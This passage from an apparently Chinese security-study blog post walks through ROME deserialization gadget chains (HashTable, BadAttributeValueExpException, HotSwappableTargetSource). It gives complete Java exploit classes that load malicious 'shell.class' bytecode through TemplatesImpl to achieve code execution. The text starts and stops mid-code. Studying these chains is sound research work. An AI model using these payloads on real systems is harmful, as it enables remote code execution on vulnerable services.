class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2.bin&quot;</span>));<br>        oos.writeObject(object);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser2.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span>[] byteCodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaSec\\CC1\\target\\classes\\ROME\\shell.class&quot;</span>));<br>        setValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;ROME&quot;</span>);<br>        setValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;byteCodes&#125;);<br>        setValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;123&quot;</span>);<br>        setValue(toStringBean,<span class="hljs-string">&quot;_obj&quot;</span>,templates);<br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser2.bin&quot;</span>);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" title="HashTable利用链"></a>HashTable利用链</h4><p>这个链子是当<code>HashMap</code>类被过滤掉了，我们可以使用这个链子来改变入口点</p>
<p>我们看一下<code>HashTable</code>的<code>readobject</code></p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507181529127.png" srcset="/img/loading.gif" lazyload alt="image-20250718152858750"></p>
<p>发现每个对象都会被<code>reconstitutionPut</code>进行处理，跟进<code>reconstitutionPut</code>，看一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>        <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>        <span class="hljs-comment">// This should not happen in deserialized version.</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Creates the new entry.</span><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>很好，关键代码：<code>int hash = key.hashCode();</code></p>
<p>那就就是换掉开头就行：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">HashTable<span class="hljs-selector-class">.readObject</span>()<br>    ↓<br>HashTable<span class="hljs-selector-class">.reconstitutionPut</span>() <span class="hljs-comment">//会任意类调用hashcode()</span><br>    ↓<br>EqualsBean<span class="hljs-selector-class">.hashCode</span>()  <span class="hljs-comment">// 调用 beanHashCode()</span><br>    ↓<br>EqualsBean<span class="hljs-selector-class">.beanHashCode</span>()<br>    ↓<br>_obj<span class="hljs-selector-class">.toString</span>()        <span class="hljs-comment">// 调用 ToStringBean.toString()</span><br>    ↓<br>ToStringBean<span class="hljs-selector-class">.toString</span>()<span class="hljs-comment">// 反射调用 TemplatesImpl.getOutputProperties()</span><br>    ↓<br>TemplatesImpl<span class="hljs-selector-class">.getOutputProperties</span>()<br>    ↓<br>触发 <span class="hljs-built_in">defineTransletClasses</span>() → 加载恶意字节码 → RCE<br></code></pre></td></tr></table></figure>

<h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser3.bin&quot;</span>));<br>        oos.writeObject(object);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser3.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaSec\\CC1\\target\\classes\\ROME\\shell.class&quot;</span>));<br>        setValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;ROME&quot;</span>);<br>        setValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecodes&#125;);<br>        setValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(equalsBean,<span class="hljs-string">&quot;123&quot;</span>);<br>        setValue(toStringBean,<span class="hljs-string">&quot;_obj&quot;</span>,templates);<br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser3.bin&quot;</span>);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="BadAttributeValueExpException利用链"><a href="#BadAttributeValueExpException利用链" class="headerlink" title="BadAttributeValueExpException利用链"></a>BadAttributeValueExpException利用链</h4><p>看一下这个类的<code>readObject</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>            val = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，当<code>System.getSecurityManager() == null</code>会调用任意一个类的<code>tostring</code>方法跟进看一下</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507181801798.png" srcset="/img/loading.gif" lazyload alt="image-20250718180147463"></p>
<p>是null，那我们可以用它来直接调用<code>tostring()</code>方法，进行反序列化</p>
<p>那链子就是</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">BadAttributeValueExpException<span class="hljs-selector-class">.readObject</span>()<br>↓<br>ToStringBean<span class="hljs-selector-class">.toString</span>()<br>↓<br>TemplatesImpl<span class="hljs-selector-class">.getOutputProperties</span>()<br>↓<br>触发 <span class="hljs-built_in">defineTransletClasses</span>() → 加载恶意字节码 → RCE<br></code></pre></td></tr></table></figure>

<h5 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser4.bin&quot;</span>));<br>        oos.writeObject(object);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser4.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span> [] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaSec\\CC1\\target\\classes\\ROME\\shell.class&quot;</span>));<br>        setValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;ROME&quot;</span>);<br>        setValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecodes&#125;);<br>        setValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        setValue(toStringBean,<span class="hljs-string">&quot;_obj&quot;</span>,templates);<br>        <span class="hljs-comment">//这边也是先搞个占位符，以免在序列化的过程中就触发</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">123</span>);<br>        <span class="hljs-comment">//然后反射把123修改成toStringBean</span><br>        setValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,toStringBean);<br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;ser4.bin&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="HotSwappableTargetSource利用链"><a href="#HotSwappableTargetSource利用链" class="headerlink" title="HotSwappableTargetSource利用链"></a>HotSwappableTargetSource利用链</h4><p>这个链子是<code>spring</code>原生的，是把toString的调用者改为了spring原生的<code>HotSwappableTargetSource</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">加个spring依赖<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.1.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>那让我们来继续看代码，在XString的一个equals方法中找到了调用toString方法</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507182120590.png" srcset="/img/loading.gif" lazyload alt="image-20250718212021376"></p>
<p>然后在HotSwappableTargetSource中发现了调用equals方法的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object other)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span> == other || other <span class="hljs-keyword">instanceof</span> HotSwappableTargetSource &amp;&amp; <span class="hljs-built_in">this</span>.target.equals(((HotSwappableTargetSource)other).target);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>那我们怎么调用HotSwappableTargetSource的equals方法呢？在HashMap中找到了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> V <span class="hljs-title function_">putVal</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, K key, V value, <span class="hljs-type">boolean</span> onlyIfAbsent,</span><br><span class="hljs-params">                   <span class="hljs-type">boolean</span> evict)</span> &#123;<br>        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="hljs-type">int</span> n, i;<br>        <span class="hljs-keyword">if</span> ((tab = table) == <span class="hljs-literal">null</span> || (n = tab.length) == <span class="hljs-number">0</span>)<br>            n = (tab = resize()).length;<br>        <span class="hljs-keyword">if</span> ((p = tab[i = (n - <span class="hljs-number">1</span>) &amp; hash]) == <span class="hljs-literal">null</span>)<br>            tab[i] = newNode(hash, key, value, <span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">else</span> &#123;<br>            Node&lt;K,V&gt; e; K k;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            这里调用了equals()函数，是如果不为空，就会比较传入的key的哈希值是否相等。调用的是后者的equals，传入的是前者的参数，所以我们写EXP的时候要注意，先put(HotSwappableTargetSource(toStringBean))，来保证是XString.equals(HotSwappableTargetSource(toStringBean))</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-keyword">if</span> (p.hash == hash &amp;&amp;<br>                ((k = p.key) == key || (key != <span class="hljs-literal">null</span> &amp;&amp; key.equals(k))))<br>                e = p;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p <span class="hljs-keyword">instanceof</span> TreeNode)<br>                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="hljs-built_in">this</span>, tab, hash, key, value);<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">binCount</span> <span class="hljs-operator">=</span> <span 